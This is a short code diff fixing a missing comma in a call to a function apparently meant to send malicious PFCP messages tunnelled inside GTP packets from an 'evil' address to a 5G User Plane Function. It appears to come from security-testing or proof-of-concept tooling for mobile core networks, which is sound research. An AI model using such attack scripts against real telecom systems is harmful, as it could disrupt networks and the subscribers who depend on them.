@@ -99,7 +99,7 @@ def send_malicious_pfcp_in_gtp_packet(
 
 
 send_malicious_pfcp_in_gtp_packet(
-    src_addr=EVIL_ADDR
+    src_addr=EVIL_ADDR,
     dest_addr=UPF_ADDR,
     teid=sys.argv[1],
 )
